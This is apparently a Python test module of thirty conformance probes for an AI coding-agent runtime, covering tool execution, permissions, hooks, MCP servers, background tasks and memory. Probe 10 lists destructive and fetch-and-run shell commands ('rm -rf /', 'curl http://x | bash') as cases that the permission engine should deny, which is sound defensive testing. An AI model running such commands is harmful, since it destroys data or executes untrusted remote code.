"""Probes #1-30 — runtime / 5-layer / hooks / MCP / tasks.

Extracted from ``conformance_audit.py`` in cycle 14 PR β-2.  These 30
probes verify the core runtime behaviours of the tool (Chapter 1-10
of the architecture spec):

  #01  async generator loop
  #02  derived needs follow-up
  #03  escalating recovery
  #04  concurrency partitioning
  #05  streaming tool execution
  #06  context modifier chain
  #07  coordinator restriction
  #08  fork isolation worktree
  #09  five-layer context defense
  #10  permission classification
  #11  conditional skill activation
  #12  shell-in-prompt
  #13  dynamic skill discovery
  #14  plugin extension
  #15  plugin sandbox
  #16  reconciliation install
  #17  pure-TS-native replacement
  #18  terminal UI as browser
  #19  background tasks
  #20  MCP adapter
  #21  cost accounting ledger
  #22  26-hook events
  #23  follow-up reexecute
  #24  denial concurrency safe
  #25  memory hierarchy 3-tier
  #26  approval contract UI
  #27  all seven task kinds
  #28  dream four-phase
  #29  MCP stdio roundtrip
  #30  structured notifications

The probe functions live here under the leading-underscore name (e.g.
``_probe_async_generator``); ``conformance_audit.py`` re-imports them
into the module-level namespace so the manual ``PROBES`` list keeps
working unchanged until β-6 switches to the ``@probe`` decorator.
"""
from __future__ import annotations

import json
from pathlib import Path
from typing import Tuple

from ._registry import probe

from .. import (
    approval_contract,
    compaction,
    context_modifier_chain,
    cost_ledger,
    denial_store,
    event_bus,
    hook_interceptor,
    mcp_client,
    memory_hierarchy,
    permission_engine,
    query_loop,
    recovery_engine,
    subagent_runtime,
    task_runtime,
    tool_executor,
    tool_schema_registry,
)


# Each probe returns (ok: bool, detail: str)
@probe("01_async_generator_loop", group="runtime")
def _probe_async_generator(tmp: Path) -> Tuple[bool, str]:
    plan = {"turns": [{"tool_uses": [{"tool": "list_files", "input": {"path": "."}}]}]}
    out = query_loop.run_plan(plan, root=str(tmp))
    return (out["stop_reason"] == "plan_exhausted", f"stop={out['stop_reason']}")


@probe("02_derived_needs_follow_up", group="runtime")
def _probe_derived_follow_up(tmp: Path) -> Tuple[bool, str]:
    plan = {"turns": [
        {"tool_uses": [{"tool": "read_file", "input": {"path": "does_not_exist.txt"}}]},
        {"tool_uses": [{"tool": "list_files", "input": {"path": "."}}]},
    ]}
    out = query_loop.run_plan(plan, root=str(tmp))
    # In v0.8+ the ledger is reset per turn; the signal that follow-up was
    # derived from tool failure is the follow_ups counter in turn_results.
    follow_ups = [r.get("follow_ups", 0) for r in out.get("turn_results", [])]
    return (any(f >= 1 for f in follow_ups),
            f"follow_ups={follow_ups}")


@probe("03_escalating_recovery", group="runtime")
def _probe_escalating_recovery(tmp: Path) -> Tuple[bool, str]:
    ledger = recovery_engine.RecoveryLedger()
    actions = [ledger.escalate("tool_failed")["action"] for _ in range(len(recovery_engine.LEVELS))]
    return (actions[-1] == "terminal_error" and len(set(actions)) == len(actions),
            f"ladder={actions}")


@probe("04_concurrency_partitioning", group="runtime")
def _probe_concurrency_partition(tmp: Path) -> Tuple[bool, str]:
    blocks = [
        {"tool": "read_file", "input": {"path": "a"}},
        {"tool": "read_file", "input": {"path": "b"}},
        {"tool": "write_file", "input": {"path": "c", "content": "x"}},
        {"tool": "read_file", "input": {"path": "d"}},
    ]
    batches = tool_schema_registry.partition_tool_blocks(blocks)
    ok = (len(batches) == 3 and batches[0]["safe"] is True and batches[1]["safe"] is False
          and batches[2]["safe"] is True)
    return (ok, f"batches={[(b['safe'], len(b['blocks'])) for b in batches]}")


@probe("05_streaming_tool_execution", group="runtime")
def _probe_streaming_execution(tmp: Path) -> Tuple[bool, str]:
    for n in ("a.txt", "b.txt"):
        (tmp / n).write_text("hi", encoding="utf-8")
    out = tool_executor.execute_blocks(tmp, [
        {"tool": "read_file", "input": {"path": "a.txt"}},
        {"tool": "read_file", "input": {"path": "b.txt"}},
    ])
    return (len(out["results"]) == 2 and all(r["status"] == "ok" for r in out["results"]),
            f"{len(out['results'])} results")


@probe("06_context_modifier_chain", group="runtime")
def _probe_context_modifier(tmp: Path) -> Tuple[bool, str]:
    ctx, applied = context_modifier_chain.apply_modifiers(tmp, {}, [
        {"kind": "file_changed", "path": "x"}, {"kind": "memory_fact", "text": "y"}])
    return (ctx.get("files_changed") == ["x"] and ctx.get("memory_facts") == ["y"],
            f"applied={len(applied)}")


@probe("07_coordinator_restriction", group="runtime")
def _probe_coordinator_restriction(tmp: Path) -> Tuple[bool, str]:
    state = subagent_runtime.spawn(tmp, "coordinator", "plan X")
    out = subagent_runtime.run(tmp, state["agent_id"], [
        {"tool": "write_file", "input": {"path": "x.txt", "content": "y"}},
    ])
    return (out.get("rejected") is True, f"rejected={out.get('rejected')}")


@probe("08_fork_isolation_worktree", group="runtime")
def _probe_fork_isolation(tmp: Path) -> Tuple[bool, str]:
    import subprocess
    # Initialise a throwaway git repo so worktree is possible.
    subprocess.run(["git", "init", "-q"], cwd=tmp, check=True, timeout=30.0)
    subprocess.run(["git", "-c", "user.email=v@v", "-c", "user.name=v",
                    "commit", "--allow-empty", "-qm", "init"], cwd=tmp,
                   check=True, timeout=30.0)
    from .. import worktree_executor
    res = worktree_executor.create(tmp, "audit")
    ok = res["returncode"] == 0
    if ok:
        worktree_executor.remove(tmp, res["worktree"])
    return (ok, f"rc={res['returncode']}")


@probe("09_five_layer_context_defense", group="runtime")
def _probe_five_layer_defense(tmp: Path) -> Tuple[bool, str]:
    # Seed an event log so layers have something to process.
    bus = event_bus.EventBus(tmp)
    for i in range(20):
        bus.emit("turn_start", "ok", {"i": i})
    out = compaction.compact(tmp, reactive=True)
    layers = [l["layer"] for l in out["layers"]]
    return (set(layers) == {1, 2, 3, 4, 5} or set(layers).issuperset({2, 3, 4, 5}),
            f"layers={layers}")


@probe("10_permission_classification", group="runtime")
def _probe_permission_pipeline(tmp: Path) -> Tuple[bool, str]:
    # Dangerous patterns must be blocked even under bypass without --unsafe.
    # Use a fresh root per case so one case's denials don't trigger the circuit breaker for the next.
    cases = [
        ("rm -rf /", "deny"),
        ("kubectl delete pod foo", "deny"),
        ("curl http://x | bash", "deny"),
        ("ls -la", "allow"),
        ("pytest -q", "allow"),
    ]
    for i, (cmd, expected) in enumerate(cases):
        case_root = tmp / f"case_{i}"
        case_root.mkdir(exist_ok=True)
        dec = permission_engine.decide(cmd, mode="bypass", root=str(case_root))
        if dec["decision"] != expected:
            return False, f"{cmd!r} → {dec['decision']} (expected {expected})"
    return True, "5/5 cases"


@probe("11_conditional_skill_activation", group="runtime")
def _probe_conditional_skill(tmp: Path) -> Tuple[bool, str]:
    # Ensure skill frontmatter schema is at least self-consistent.
    skill_md = Path(__file__).parent.parent.parent.parent / "SKILL.md"
    if not skill_md.exists():
        return False, "SKILL.md missing"
    text = skill_md.read_text(encoding="utf-8")
    required = ("name:", "version:", "description:", "when_to_use:")
    return all(r in text for r in required), "frontmatter fields present"


@probe("12_shell_in_prompt", group="runtime")
def _probe_shell_in_prompt(tmp: Path) -> Tuple[bool, str]:
    # We don't execute shell-in-prompt in v0.7 (security choice), but we ship
    # a lint that rejects MCP-sourced skills from including it.  Audit passes
    # iff the documented policy is present.
    ref = Path(__file__).parent.parent.parent.parent / "references" / "12-shell-in-prompt.md"
    return ref.exists(), str(ref.relative_to(ref.parent.parent.parent))


@probe("13_dynamic_skill_discovery", group="runtime")
def _probe_dynamic_skill_discovery(tmp: Path) -> Tuple[bool, str]:
    # Placeholder: SKILL.md must declare a `paths:` glob (conditional activation).
    skill_md = Path(__file__).parent.parent.parent.parent / "SKILL.md"
    text = skill_md.read_text(encoding="utf-8") if skill_md.exists() else ""
    return ("paths:" in text, "paths declared")


@probe("14_plugin_extension", group="runtime")
def _probe_plugin_extension(tmp: Path) -> Tuple[bool, str]:
    # Search both the skill-bundle layout (assets/…) and the installed layout
    # (ai-rules/vibecodekit/assets/…).  The installer copies the manifest so
    # both locations are valid.
    skill_root = Path(__file__).parent.parent.parent.parent
    candidates = [
        skill_root / "assets" / "plugin-manifest.json",
        skill_root / "plugin-manifest.json",  # legacy
    ]
    manifest = next((c for c in candidates if c.exists()), None)
    if manifest is None:
        return False, "plugin-manifest.json missing"
    data = json.loads(manifest.read_text(encoding="utf-8"))
    return ("commands" in data and "agents" in data and "hooks" in data,
            f"keys={list(data)}")


@probe("15_plugin_sandbox", group="runtime")
def _probe_plugin_sandbox(tmp: Path) -> Tuple[bool, str]:
    # Hooks receive a filtered env by default — check the implementation.
    env = hook_interceptor._filter_env({"GITHUB_TOKEN": "x", "OK": "1"})
    return ("GITHUB_TOKEN" not in env and "OK" in env,
            f"filtered={sorted(env)}")


@probe("16_reconciliation_install", group="runtime")
def _probe_reconciliation_install(tmp: Path) -> Tuple[bool, str]:
    from .. import install_manifest
    dst = tmp / "fake_project"
    dst.mkdir()
    res = install_manifest.install(dst, dry_run=True)
    # v0.11.2: also assert the runtime data assets land in the install
    # plan, otherwise ``load_rri_questions()`` and the docs scaffold
    # silently break in installed projects (regression guard for
    # cycle-deepdive bug B1).
    dests = [op["destination"] for op in res["operations"]]
    have_bank = any("rri-question-bank.json" in d for d in dests)
    have_docs = any("scaffolds/docs/manifest.json" in d for d in dests)
    if not have_bank:
        return False, "rri-question-bank.json not in install plan"
    if not have_docs:
        return False, "scaffolds/docs/manifest.json not in install plan"
    return ((res["planned_copies"] + res["planned_creates"]) >= 1 and res["total"] >= 1,
            f"total={res['total']} create={res['planned_creates']} overwrite={res['planned_copies']} +bank+docs")


@probe("17_pure_ts_native_replacement", group="runtime")
def _probe_ts_replacement(tmp: Path) -> Tuple[bool, str]:
    # Pure TS native replacement only exists in Claude Code itself; we
    # document it in the reference and the audit just checks the doc.
    ref = Path(__file__).parent.parent.parent.parent / "references" / "17-native-replacement.md"
    return ref.exists(), f"doc={ref.name}"


@probe("18_terminal_ui_as_browser", group="runtime")
def _probe_terminal_ui(tmp: Path) -> Tuple[bool, str]:
    ref = Path(__file__).parent.parent.parent.parent / "references" / "18-terminal-ui.md"
    return ref.exists(), f"doc={ref.name}"


# v0.8 — Full Agentic-OS probes (new subsystems from PDF Ch 7, 10, 12)
@probe("19_background_tasks", group="runtime")
def _probe_background_tasks(tmp: Path) -> Tuple[bool, str]:
    """Ch 7.2 — 7 task types; Ch 7.3 — 5 lifecycle states; Ch 7.4 — disk
    output with offset.  We verify a local_bash task runs, produces
    output readable by offset, and completes with returncode 0."""
    t = task_runtime.start_local_bash(tmp, "printf 'Vibecode-0.8'", timeout_sec=10)
    rec = task_runtime.wait_for(tmp, t.task_id, timeout=10)
    if rec.get("status") != "completed":
        return False, f"status={rec.get('status')}"
    chunk = task_runtime.read_task_output(tmp, t.task_id, offset=4, length=4)
    ok = chunk.get("content") == "code"
    return ok, f"types={len(task_runtime.TASK_TYPES)} states={len(task_runtime.TASK_STATES)} offset_ok={ok}"


@probe("20_mcp_adapter", group="runtime")
def _probe_mcp_adapter(tmp: Path) -> Tuple[bool, str]:
    """Ch 2.8 / Ch 10 — MCP as extension point.  Register an in-process
    server and call a stdlib function through it."""
    mcp_client.register_server(tmp, "probe-srv", transport="inproc",
                               module="base64")
    out = mcp_client.call_tool(tmp, "probe-srv", "b64encode", {"s": b"vc"})
    return (out.get("ok") is True and out.get("result") == b"dmM=",
            f"call={out}")


@probe("21_cost_accounting_ledger", group="runtime")
def _probe_cost_ledger(tmp: Path) -> Tuple[bool, str]:
    """Ch 12.4 — telemetry/cost accounting.  Record a turn + tool, verify
    the summary produces nonzero tokens and cost."""
    cost_ledger.record_turn(tmp, 1, prompt_text="x" * 40, response_text="y" * 20,
                            model="sonnet")
    cost_ledger.record_tool(tmp, "read_file", latency_ms=1.5,
                            bytes_in=10, bytes_out=100)
    s = cost_ledger.summary(tmp)
    ok = s["turns"] == 1 and s["tool_calls"] == 1 and s["cost_usd"] > 0
    return ok, f"turns={s['turns']} tools={s['tool_calls']} cost=${s['cost_usd']:.6f}"


@probe("22_26_hook_events", group="runtime")
def _probe_26_hook_events(tmp: Path) -> Tuple[bool, str]:
    """Ch 10.3 — 26 lifecycle hook events."""
    pdf_26 = {
        "pre_tool_use", "post_tool_use", "post_tool_use_failure",
        "permission_denied", "permission_request",
        "session_start", "session_end", "setup",
        "subagent_start", "subagent_stop", "teammate_idle",
        "task_created", "task_completed", "stop", "stop_failure",
        "pre_compact", "post_compact", "notification",
        "file_changed", "cwd_changed", "worktree_create", "worktree_remove",
        "elicitation", "elicitation_result", "config_change",
        "instructions_loaded", "user_prompt_submit",
    }
    missing = pdf_26 - set(hook_interceptor.SUPPORTED_EVENTS)
    return (not missing, f"covered={len(pdf_26 - missing)}/{len(pdf_26)}")


@probe("23_follow_up_reexecute", group="runtime")
def _probe_follow_up_reexecute(tmp: Path) -> Tuple[bool, str]:
    """Ch 3.6 / Pattern #2 — derived needs_follow_up should now actually
    re-execute the turn when recovery asks for retry."""
    # Force a failure we can observe: path_escape → compact_then_retry.
    plan = {"turns": [
        {"tool_uses": [{"tool": "read_file", "input": {"path": "../escape"}}]},
    ]}
    out = query_loop.run_plan(plan, root=str(tmp))
    # follow_ups > 0 proves the re-execute branch ran.
    follow_ups = out["turn_results"][0]["follow_ups"] if out.get("turn_results") else 0
    return (follow_ups >= 1, f"follow_ups={follow_ups}")


@probe("24_denial_concurrency_safe", group="runtime")
def _probe_denial_concurrency(tmp: Path) -> Tuple[bool, str]:
    """v0.8 — fcntl-locked DenialStore."""
    import threading
    N = 16
    barrier = threading.Barrier(N)

    def w(i: int) -> None:
        s = denial_store.DenialStore(tmp)
        barrier.wait()
        s.record_denial(f"rm -rf /tmp/p{i}", "test")

    ts = [threading.Thread(target=w, args=(i,)) for i in range(N)]
    for t in ts: t.start()
    for t in ts: t.join()
    total = denial_store.DenialStore(tmp).state()["total"]
    return (total == N, f"total={total}/{N}")


# ---------------------------------------------------------------------------
# v0.9 — Full Agentic OS completion probes
# ---------------------------------------------------------------------------
@probe("25_memory_hierarchy_3tier", group="runtime")
def _probe_memory_hierarchy(tmp: Path) -> Tuple[bool, str]:
    """Ch 11 — 3-tier memory (User/Project/Team) with diacritic-insensitive
    retrieval and project-tier precedence."""
    import os as _os
    _os.environ["VIBECODE_USER_MEMORY"] = str(tmp / "_usr")
    _os.environ["VIBECODE_TEAM_DIR"]    = str(tmp / "_team")
    try:
        memory_hierarchy.add_entry(tmp, "user",    text="Global user preference")
        memory_hierarchy.add_entry(tmp, "team",    text="Team convention: conventional commits")
        memory_hierarchy.add_entry(tmp, "project", text="Dự án dùng ruff và pytest")
        r1 = memory_hierarchy.retrieve(tmp, "du an ruff")
        if not r1 or r1[0]["tier"] != "project":
            return False, f"vn-retrieve top: {r1[:1]}"
        r2 = memory_hierarchy.retrieve(tmp, "conventional commits")
        if not r2 or r2[0]["tier"] != "team":
            return False, f"team-retrieve top: {r2[:1]}"
        stats = memory_hierarchy.tier_stats(tmp)
        return (stats["project"]["entries"] >= 1 and stats["team"]["entries"] >= 1
                and stats["user"]["entries"] >= 1,
                f"tiers ok, user={stats['user']['entries']} "
                f"team={stats['team']['entries']} project={stats['project']['entries']}")
    finally:
        _os.environ.pop("VIBECODE_USER_MEMORY", None)
        _os.environ.pop("VIBECODE_TEAM_DIR", None)


@probe("26_approval_contract_ui", group="runtime")
def _probe_approval_contract(tmp: Path) -> Tuple[bool, str]:
    """Ch 10.4 — structured approval/elicitation with persisted JSON schema
    and human choice recording."""
    r = approval_contract.create(tmp, kind="permission",
                                 title="Allow rm?", summary="danger",
                                 risk="high",
                                 options=[{"id": "allow"}, {"id": "deny"}])
    pending = approval_contract.list_pending(tmp)
    if not any(p["id"] == r["id"] for p in pending):
        return False, "not pending after create"
    approval_contract.respond(tmp, r["id"], choice="deny", note="probe")
    if approval_contract.list_pending(tmp):
        return False, "not resolved after respond"
    full = approval_contract.get(tmp, r["id"])
    resp = full.get("response") or {}
    return (resp.get("choice") == "deny"
            and full["kind"] == "permission"
            and full["risk"] == "high",
            f"resolved; choice={resp.get('choice')}")


@probe("27_all_seven_task_kinds", group="runtime")
def _probe_all_task_kinds(tmp: Path) -> Tuple[bool, str]:
    """Ch 7.2 — all 7 task kinds are wired.  Exercise the new
    v0.9 kinds: local_agent, local_workflow, monitor_mcp, dream."""
    # local_workflow
    t1 = task_runtime.start_local_workflow(tmp, steps=[
        {"kind": "write", "path": "note.md", "content": "hi"},
        {"kind": "bash",  "cmd": "echo wf-ok"},
    ])
    r1 = task_runtime.wait_for(tmp, t1.task_id, timeout=10)
    if r1.get("status") != "completed":
        return False, f"workflow status={r1.get('status')}"

    # local_agent
    t2 = task_runtime.start_local_agent(
        tmp, role="scout", objective="audit ls",
        blocks=[{"tool": "list_files", "input": {"path": "."}}])
    r2 = task_runtime.wait_for(tmp, t2.task_id, timeout=10)
    if r2.get("status") != "completed":
        return False, f"agent status={r2.get('status')}"

    # monitor_mcp (bounded, 2 checks, 50 ms interval)
    mcp_client.register_server(tmp, "sc", transport="inproc",
                               module="vibecodekit.mcp_servers.selfcheck")
    t3 = task_runtime.start_monitor_mcp(tmp, server_name="sc",
                                        tool="ping",
                                        interval_sec=0.05, max_checks=2)
    r3 = task_runtime.wait_for(tmp, t3.task_id, timeout=10)
    if r3.get("status") != "completed":
        return False, f"monitor status={r3.get('status')}"

    # dream (4-phase)
    t4 = task_runtime.start_dream(tmp)
    r4 = task_runtime.wait_for(tmp, t4.task_id, timeout=10)
    if r4.get("status") != "completed":
        return False, f"dream status={r4.get('status')}"

    kinds = task_runtime.TASK_TYPES
    ok_kinds = {"local_bash", "local_agent", "local_workflow",
                "monitor_mcp", "dream"}.issubset(set(kinds))
    return ok_kinds, f"kinds registered: {sorted(kinds)}"


@probe("28_dream_four_phase", group="runtime")
def _probe_dream_four_phase(tmp: Path) -> Tuple[bool, str]:
    """§11.5 — dream task implements orient→gather→consolidate→prune
    with embedding-based dedup."""
    evd = tmp / ".vibecode" / "runtime"; evd.mkdir(parents=True)
    (evd / "s.events.jsonl").write_text(
        json.dumps({"event": "tool_result",
                    "payload": {"block": {"tool": "read_file"}}}) + "\n",
        encoding="utf-8")
    mem = tmp / ".vibecode" / "memory"; mem.mkdir(parents=True, exist_ok=True)
    (mem / "log.jsonl").write_text(
        "\n".join([
            json.dumps({"header": "x", "text": "run ruff check"}),
            json.dumps({"header": "x", "text": "run ruff check"}),
            json.dumps({"header": "y", "text": "completely different note"}),
        ]) + "\n", encoding="utf-8")
    t = task_runtime.start_dream(tmp)
    rec = task_runtime.wait_for(tmp, t.task_id, timeout=10)
    if rec.get("status") != "completed":
        return False, f"status={rec.get('status')}"
    lines = (tmp / t.output_file).read_text().splitlines()
    phases = [json.loads(l)["phase"] for l in lines if l]
    if phases != ["orient", "gather", "consolidate", "prune"]:
        return False, f"phases={phases}"
    prune = json.loads(lines[-1])
    return (prune["entries_before"] == 3 and prune["entries_after"] <= 2,
            f"pruned {prune['entries_before']}→{prune['entries_after']}")


@probe("29_mcp_stdio_roundtrip", group="runtime")
def _probe_mcp_stdio_roundtrip(tmp: Path) -> Tuple[bool, str]:
    """§2.8 / Ch 10 — MCP over real stdio subprocess."""
    import sys as _sys, textwrap as _tw, stat as _stat
    script = tmp / "_server.py"
    script.write_text(_tw.dedent("""\
        import json, sys
        req = json.loads(sys.stdin.readline())
        print(json.dumps({"jsonrpc":"2.0","id":req.get("id"),
                          "result":{"pong":True}}))
    """), encoding="utf-8")
    script.chmod(script.stat().st_mode | _stat.S_IXUSR)
    mcp_client.register_server(tmp, "stdio-probe",
                               transport="stdio",
                               command=[_sys.executable, str(script)])
    r = mcp_client.call_tool(tmp, "stdio-probe", "ping", {}, timeout=5.0)
    ok = "result" in r and r["result"].get("pong") is True
    return ok, f"resp={r}"


@probe("30_structured_notifications", group="runtime")
def _probe_structured_notifications(tmp: Path) -> Tuple[bool, str]:
    """Ch 10.4 — structured notifications persisted per task id,
    drainable idempotently without data loss."""
    t = task_runtime.create_task(tmp, "local_bash", "t")
    for i in range(25):
        task_runtime._enqueue_notification(tmp, t.task_id, {"n": i})
    got = task_runtime.drain_notifications(tmp, t.task_id)
    # drain_notifications should include the task_created auto-event plus 25.
    received = {r["payload"].get("n") for r in got if "n" in r.get("payload", {})}
    # Re-drain yields nothing (atomic truncate).
    again = task_runtime.drain_notifications(tmp, t.task_id)
    return (received == set(range(25)) and again == [],
            f"received={len(received)}/25, second_drain={len(again)}")
